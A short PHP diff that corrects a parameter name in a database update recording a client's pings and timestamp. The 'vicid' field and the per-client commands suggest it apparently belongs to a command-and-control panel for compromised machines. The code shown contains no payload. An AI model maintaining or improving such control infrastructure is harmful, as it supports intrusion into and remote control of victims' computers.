@@ -255,7 +255,7 @@ class Clients extends Database
 		$pinged_at = date("m/d/Y H:i:s", time());
 		$sql = "UPDATE clients SET pings = :ping,update_at = :update_at WHERE vicid = :vicid";
 		$stmt = $pdo->prepare($sql);
-		$stmt->execute(['ping' => $old_pings + 1, "update_at" => $pinged_at, 'id' => $vicid]);
+		$stmt->execute(['ping' => $old_pings + 1, "update_at" => $pinged_at, 'vicid' => $vicid]);
 	}
 
 	// update a command if a client exist
